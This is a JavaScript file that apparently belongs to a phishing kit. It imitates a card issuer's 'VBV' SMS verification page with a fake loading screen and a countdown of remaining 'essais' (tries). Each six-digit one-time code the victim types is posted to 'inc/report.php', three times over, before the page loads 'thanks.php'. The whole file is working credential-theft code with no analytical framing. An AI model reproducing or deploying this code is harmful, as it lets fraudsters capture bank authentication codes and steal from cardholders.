    var today = new Date();
var dd = today.getDate();
var mm = today.getMonth()+1;
var yyyy = today.getFullYear();
if(dd<10){dd='0'+dd} 
if(mm<10){mm='0'+mm}today = dd+'/'+mm+'/'+yyyy;document.getElementById("date").innerHTML = today;
var myVar=setInterval(function(){myTimer()},10);
function myTimer() {var d = new Date();document.getElementById("hour").innerHTML = d.toLocaleTimeString();}
$(document).ready(function() {
    $('#vbv').hide();
    $('#loading').fadeIn(100).delay(5000).fadeOut(100,function(){$('#vbv').show();});
$( "#vbv-code" ).keyup(function() {
    if($(this).val().length < 6 || $(this).val().length == 7){
    $('.submit').addClass('disabled');$('.submit').prop("disabled", true);
}else{
    $('.submit').removeClass('disabled');
    $('.submit').prop("disabled", false);
}
});
$( "#1" ).click(function() {
$('#vbv').hide();
    $('#loading').fadeIn(100).delay(7000).fadeOut(100,function(){$('#vbv').show();});
    $('#essais').text('2');    
    $('.essais').show();  
    $.ajax({
    url: 'inc/report.php',
    method: 'post',
    data:{action:'sms1',sms:$('#vbv-code').val()}
    });
    $('#vbv-code').val("");
    $('#1').hide();
    $('#2').show();
    $('.submit').addClass('disabled');$('.submit').prop("disabled", true);

});
$( "#2" ).click(function() {
$('#vbv').hide();
    $('#loading').fadeIn(100).delay(7000).fadeOut(100,function(){$('#vbv').show();});
    $('#essais').text('1');    
    $('.essais').show(); 
    $.ajax({
    url: 'inc/report.php',
    method: 'post',
    data:{action:'sms2',sms:$('#vbv-code').val()}
    });
    $('#vbv-code').val("");
    $('#2').hide();
    $('#3').show();
    $('.submit').addClass('disabled');$('.submit').prop("disabled", true);
});
$( "#3" ).click(function() {
    $.ajax({
    url: 'inc/report.php',
    method: 'post',
    data:{action:'sms3',sms:$('#vbv-code').val()},
    beforeSend: function(){
    $('#vbv').hide();
    $('#loading').fadeIn(100).delay(7000).fadeOut(100,function(){});
    },
    success: function(){
    $('body').load('thanks.php');  
    }
    });

});
});